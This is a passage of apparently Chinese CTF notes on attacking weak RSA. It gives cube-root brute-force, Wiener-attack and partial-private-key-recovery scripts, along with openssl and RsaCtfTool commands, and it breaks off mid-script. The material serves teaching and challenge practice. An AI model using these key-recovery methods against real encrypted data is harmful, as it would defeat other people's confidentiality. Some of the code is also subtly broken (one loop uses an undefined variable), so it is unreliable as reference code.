class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+i*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">            flag_bin = int(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            flag = hex(flag_bin)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">            print(flag) </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_for</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">118600000</span>, <span class="number">118720000</span>):</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">            flag_bin = int(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            flag = hex(flag_bin)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    get_flag_for()</span><br><span class="line">    <span class="comment">#get_flag()</span></span><br></pre></td></tr></table></figure></p>
<h3 id="利用openssl解密-已知pubkey-pem和flag-enc"><a href="#利用openssl解密-已知pubkey-pem和flag-enc" class="headerlink" title="利用openssl解密(已知pubkey.pem和flag.enc)"></a>利用openssl解密(已知pubkey.pem和flag.enc)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转换pem为ne格式</span></span><br><span class="line">openssl rsa -pubin -text -modulus -<span class="keyword">in</span> pubkey.pem</span><br><span class="line"><span class="comment"># 使用私钥解密</span></span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure>
<p>分解pqd后用脚本解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">keypair.q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></p>
<h3 id="RsaCtfTool"><a href="#RsaCtfTool" class="headerlink" title="RsaCtfTool"></a>RsaCtfTool</h3><p>因为是现成的工具,所以这里记录用法<br>例子: 已知ne,e特别大,进行wiener attack<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把n,e转换为pem格式</span></span><br><span class="line">python RsaCtfTool.py --createpub -n xxx -e xxx &gt; test.pem</span><br><span class="line"><span class="comment"># 已知公钥求私钥</span></span><br><span class="line">python RsaCtfTool.py --publickey test.pem --private &gt; test.key</span><br><span class="line"><span class="comment"># 已知公钥文件和加密文件</span></span><br><span class="line">python RsaCtfTool.py --publickey xxx.pem --uncipherfile xxx.txt</span><br><span class="line"><span class="comment"># 把pem格式的公钥转换为n,e</span></span><br><span class="line">python RsaCtfTool.py --key test.key --dumpkey</span><br></pre></td></tr></table></figure></p>
<p>得到nedpq值后通过脚本解密<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>   <span class="comment">#求最大公约数</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span>         <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span>  (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a,m)</span>:</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p =<span class="number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span></span><br><span class="line">    q =<span class="number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span></span><br><span class="line">    e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line">    d =modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">    c =<span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    n =p*q</span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> n2s(m)</span><br></pre></td></tr></table></figure></p>
<h3 id="私钥恢复"><a href="#私钥恢复" class="headerlink" title="私钥恢复"></a>私钥恢复</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/!usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment"># 恢复公钥</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">public_key_file = <span class="string">"./tmp/pubkey.pem"</span></span><br><span class="line"><span class="keyword">with</span> open(public_key_file, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    public_key = RSA.importKey(f)</span><br><span class="line">    n = public_key.n</span><br><span class="line">    e = public_key.e</span><br><span class="line">print(<span class="string">"n=\n%s\ne=\n%s"</span>%(n,e))</span><br><span class="line"></span><br><span class="line"><span class="comment"># wqm @ wqm-top in ~/下载/i春秋/密码/RSA脚本整理/5私钥恢复和最优非对称加密填充/ISC2016训练赛——phrackCTF--600--godlikeRSA [22:24:30] </span></span><br><span class="line">$ cat get_private_key.py </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#私钥修复</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod, gcd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_linear</span><span class="params">(a, b, mod)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &amp; <span class="number">1</span> == <span class="number">0</span> <span class="keyword">or</span> b &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> (b * invmod(a, mod)) &amp; (mod - <span class="number">1</span>)  <span class="comment"># hack for mod = power of 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_n</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = re.sub(<span class="string">r"[^0-9a-f]"</span>, <span class="string">""</span>, s)</span><br><span class="line">    <span class="keyword">return</span> int(s, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk</span><span class="params">(s)</span>:</span></span><br><span class="line">    cleaned = <span class="string">""</span>.join(map(<span class="keyword">lambda</span> x: x[<span class="number">-2</span>:], s.split(<span class="string">":"</span>)))</span><br><span class="line">    <span class="keyword">return</span> msk_ranges(cleaned), msk_mask(cleaned), msk_val(cleaned)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_ranges</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [range(<span class="number">16</span>) <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> [int(c, <span class="number">16</span>)] <span class="keyword">for</span> c <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_mask</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> <span class="string">"f"</span> <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msk_val</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(<span class="string">"0"</span> <span class="keyword">if</span> c == <span class="string">" "</span> <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> s), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">N = to_n(<span class="string">"""00:c0:97:78:53:45:64:84:7d:8c:c4:b4:20:e9:33:</span></span><br><span class="line"><span class="string">    58:67:ec:78:3e:6c:f5:f0:5c:a0:3e:ee:dc:25:63:</span></span><br><span class="line"><span class="string">    d0:eb:2a:9e:ba:8f:19:52:a2:67:0b:e7:6e:b2:34:</span></span><br><span class="line"><span class="string">    b8:6d:50:76:e0:6a:d1:03:cf:77:33:d8:b1:e9:d7:</span></span><br><span class="line"><span class="string">    3b:e5:eb:1c:65:0c:25:96:fd:96:20:b9:7a:de:1d:</span></span><br><span class="line"><span class="string">    bf:fd:f2:b6:bf:81:3e:3e:47:44:43:98:bf:65:2f:</span></span><br><span class="line"><span class="string">    67:7e:27:75:f9:56:47:ba:c4:f0:4e:67:2b:da:e0:</span></span><br><span class="line"><span class="string">    1a:77:14:40:29:c1:a8:67:5a:8f:f5:2e:be:8e:82:</span></span><br><span class="line"><span class="string">    31:3d:43:26:d4:97:86:29:15:14:a9:69:36:2c:76:</span></span><br><span class="line"><span class="string">    ed:b5:90:eb:ec:6f:ce:d5:ca:24:1c:aa:f6:63:f8:</span></span><br><span class="line"><span class="string">    06:a2:62:cb:26:74:d3:5b:82:4b:b6:d5:e0:49:32:</span></span><br><span class="line"><span class="string">    7b:62:f8:05:c4:f7:0e:86:59:9b:f3:17:25:02:aa:</span></span><br><span class="line"><span class="string">    3c:97:78:84:7b:16:fd:1a:f5:67:cf:03:17:97:d0:</span></span><br><span class="line"><span class="string">    c6:69:85:f0:8d:fa:ce:ee:68:24:63:06:24:e1:e4:</span></span><br><span class="line"><span class="string">    4c:f8:e9:ad:25:c7:e0:c0:15:bb:b4:67:48:90:03:</span></span><br><span class="line"><span class="string">    9b:20:7f:0c:17:eb:9d:13:44:ab:ab:08:a5:c3:dc:</span></span><br><span class="line"><span class="string">    c1:98:88:c5:ce:4f:5a:87:9b:0b:bf:bd:d7:0e:a9:</span></span><br><span class="line"><span class="string">    09:59:81:fa:88:4f:59:60:6b:84:84:ad:d9:c7:25:</span></span><br><span class="line"><span class="string">    8c:e8:c0:e8:f7:26:9e:37:95:7c:e1:48:29:0f:51:</span></span><br><span class="line"><span class="string">    e7:bd:98:2f:f6:cc:80:e7:f0:32:0b:89:51:92:4e:</span></span><br><span class="line"><span class="string">    c2:6d:50:53:2b:3b:77:72:d1:bd:1a:1f:92:d7:12:</span></span><br><span class="line"><span class="string">    79:61:61:c5:a4:7e:b3:85:eb:f0:7c:6d:46:03:c5:</span></span><br><span class="line"><span class="string">    e6:d5:81:2c:ba:7e:ea:8d:51:7d:63:55:34:2a:b6:</span></span><br><span class="line"><span class="string">    d4:dc:31:5a:f1:99:e3:dc:8c:83:0b:a2:2a:d5:3c:</span></span><br><span class="line"><span class="string">    41:48:41:54:1a:a9:e8:b6:70:bf:d3:fe:ed:19:17:</span></span><br><span class="line"><span class="string">    14:94:13:b3:17:e3:8b:8e:6f:53:ed:e2:44:e8:4a:</span></span><br><span class="line"><span class="string">    32:d6:5c:0d:a8:80:f5:fc:02:e9:46:55:d5:a4:d3:</span></span><br><span class="line"><span class="string">    e7:c6:30:77:f9:73:e9:44:52:d8:13:9d:5d:bf:9e:</span></span><br><span class="line"><span class="string">    fa:3a:b5:96:79:82:5b:cd:19:5c:06:a9:00:96:fd:</span></span><br><span class="line"><span class="string">    4c:a4:73:88:1a:ec:3c:11:de:b9:3d:e0:50:00:1e:</span></span><br><span class="line"><span class="string">    ac:21:97:a1:96:7d:6b:15:f9:6c:c9:34:7f:70:d7:</span></span><br><span class="line"><span class="string">    9d:2d:d1:48:4a:81:71:f8:12:dd:32:ba:64:31:60:</span></span><br><span class="line"><span class="string">    08:26:4b:09:22:03:83:90:17:7f:f3:a7:72:57:bf:</span></span><br><span class="line"><span class="string">    89:6d:e4:d7:40:24:8b:7b:bd:df:33:c0:ff:30:2e:</span></span><br><span class="line"><span class="string">    e8:6c:1d"""</span>)</span><br><span class="line"></span><br><span class="line">p_ranges, pmask_msk, pmask_val = msk(<span class="string">""" 0: e:  :  :  :c :c :  :  :  :b :  :  :  :  :</span></span><br><span class="line"><span class="string">      :ab: e: 2: 8:c :  :  : 1:6 :6 : 6: f:d9: 0:</span></span><br><span class="line"><span class="string">    8 :5c:7 :06:  :  :  :0 : 3:5 :4b:  :6 :  :  :</span></span><br><span class="line"><span class="string">    2 :  :6 :  :  :  :2 :bc: c:  :85:1 : 1:d : 3:</span></span><br><span class="line"><span class="string">     1:b4:  : b: 1: 3: d:a :  :  :6e: 0:b :2 :  :</span></span><br><span class="line"><span class="string">      :b :  :9 :e :  :82:8d:  :  :13:  :  : a: a:</span></span><br><span class="line"><span class="string">      :  :4 :  :c : f:  :  :7 :e :0a:  :  : b: 5:</span></span><br><span class="line"><span class="string">      : e:91:3 :  :3c: 9:  : 6:  :  :b5:7d: 1:  :</span></span><br><span class="line"><span class="string">      :  :  :b :a1:99:6 :4 :3 :c :1a:02:4 :  : 9:</span></span><br><span class="line"><span class="string">    9 :f : d:bd:  :0 :  :  :  :b3:  : 4:  :e9: 9:</span></span><br><span class="line"><span class="string">      : d:  :  :7 :  :93:  : e:dc:  : 0:  :e7:  :</span></span><br><span class="line"><span class="string">    e :  :2 : b: 2:5 :  :  :  :  : c:5f:  :  :e2:</span></span><br><span class="line"><span class="string">      :  : 9:  :2a:  : e:  :  :2 :  :9f: 7:3 :  :</span></span><br><span class="line"><span class="string">    b : f:b :  : 8: 7:  :  :f :6 :e :c :  :3 :  :</span></span><br><span class="line"><span class="string">    f7: 5: 8: 5:  :  :  :  :  : 8: e:  :03: c:  :</span></span><br><span class="line"><span class="string">    33:76:e : 1:7 : c:  : 0:  :0b:  : a:  : 2: 9:</span></span><br><span class="line"><span class="string">      :c8:bf:  :  :06: 7:d5:  :02: c:b :e2: 7:2 :</span></span><br><span class="line"><span class="string">      :  """</span>)</span><br><span class="line"></span><br><span class="line">q_ranges, qmask_msk, qmask_val = msk(<span class="string">""" 0: f:  :d0: 1:55: 4:31:  : b:c4:8 :  : e: d:</span></span><br><span class="line"><span class="string">    34: 3:f :  :  :  :  : 8:99:1 :  : a:0 :  :4 :</span></span><br><span class="line"><span class="string">    0 :  :f :  :a4:41:2 :  :a :  : 1:  : a: c:  :</span></span><br><span class="line"><span class="string">      :  : 9:  :  : 2:f4: f:  :  :  :  :1 : 4:9 :</span></span><br><span class="line"><span class="string">    a :  :  :79:0 :  :  :  :  : 2: 8:b :  :4 : 8:</span></span><br><span class="line"><span class="string">      :9b: 1:  :d :  :f :e4:  :4 :c :e :  :3 :  :</span></span><br><span class="line"><span class="string">     7:2 :  :d :8 :2 :7 :  :d :67:fc:e : 0:f9: 7:</span></span><br><span class="line"><span class="string">    8 :  :  :  :1 :2f:  :51:  :  :2e:0a: e:3d: 6:</span></span><br><span class="line"><span class="string">    b :  :dd:  : 0:fb:  :f4:  :  :  :b4: 9:c :  :</span></span><br><span class="line"><span class="string">     a:  :  :  :d :  :  :6b: 2:  :9b: a:60:  :d6:</span></span><br><span class="line"><span class="string">     0:4f:16:d1:  :  :5 :fc:  :f :  :8 :  :  :  :</span></span><br><span class="line"><span class="string">     1: 6:e1:9 : e:4 : 6: c: d:d :73: 3:  :  :7 :</span></span><br><span class="line"><span class="string">      :8 : 9:  :3b:f : 2:  :  :f1: e:  :  :1e:  :</span></span><br><span class="line"><span class="string">    8 :  :  : 6:0 : 4:99:e :  : 5:  :  : 4:  :  :</span></span><br><span class="line"><span class="string">      : a:81:64:  :7 :f : 9: d:  :9 :  : 7:93:f :</span></span><br><span class="line"><span class="string">    ac:8c:  : 8:  : 0: d: 8:  :7 :  :1d:  :f :  :</span></span><br><span class="line"><span class="string">    1 :a :6 :8 :  :60:  :b3:  :  :  :89:  :  :14:</span></span><br><span class="line"><span class="string">      :5 """</span>)</span><br><span class="line"></span><br><span class="line">_, dmask_msk, dmask_val = msk(<span class="string">"""  :  :  : f:8 :a5:d : 2: 0:b :7 :  : 1:  : 4:</span></span><br><span class="line"><span class="string">     1:0d:  :3 :  :6 :  :  : b:  :  :  :e :  :  :</span></span><br><span class="line"><span class="string">    0e: 0:db:  :1a:1c:c0:  : e:  :  :99:bc:8 :a5:</span></span><br><span class="line"><span class="string">    7 :7 :7 : b:  :  : 8: 8:  :7 :55: 2:  :  :f :</span></span><br><span class="line"><span class="string">    b2:  :  :b :f :4 :  : 8:  :b :  :  :  : 0:  :</span></span><br><span class="line"><span class="string">    0 :  :6 :9 :  :  :  : b: 4:  : 0: a: 5:07:b :</span></span><br><span class="line"><span class="string">     9: c:9a: 9:  : 7:9e:  : b:60:f :  :  :  :0 :</span></span><br><span class="line"><span class="string">      : 3:0 :  :  :  : 1:b :  :  : b: 6:0 :f :  :</span></span><br><span class="line"><span class="string">      : 2:18: 6: b:1 :  :  :  :  :d3:f3:  :a :  :</span></span><br><span class="line"><span class="string">     3:  :  :  :  : 3: d: 1: 2:7 :  : d:  : 2: d:</span></span><br><span class="line"><span class="string">      :  : d:4 :  :d :  :6d: c:a :b6:  :  :  : 1:</span></span><br><span class="line"><span class="string">    69:  : 7:  :89:  :c :8 :61: d:25: 3:7 :1b: 4:</span></span><br><span class="line"><span class="string">    b :  :8 :55:  :49: 1:2 :3 :  :1 :e9:a8: 3:  :</span></span><br><span class="line"><span class="string">    9 :  : 1:f8:d3:  :e :  :d :  :9 :b6:  :  :71:</span></span><br><span class="line"><span class="string">    1 :  :c1:  : b: 1:  : 6:e :  :64:  :  :1a:c :</span></span><br><span class="line"><span class="string">      : b:  :bf:c :  : 0:  : 8:a :4 :  :26:a :5 :</span></span><br><span class="line"><span class="string">    6 :  :  :  :eb:  :e5: a:  :3e:f9:10:0 :  :  :</span></span><br><span class="line"><span class="string">     6:0 :  : 8:  : 1:72: c:0 : f:5 : f:9c: 0: e:</span></span><br><span class="line"><span class="string">     7:b :  :  :  :  :d9: 4:  : e:c :68:  :  :  :</span></span><br><span class="line"><span class="string">     c:  :3a:  :  :a0:ea: 3: 4:  :72:a :d : 8:  :</span></span><br><span class="line"><span class="string">      :0d:5 :0 : a: 7:c :bb: 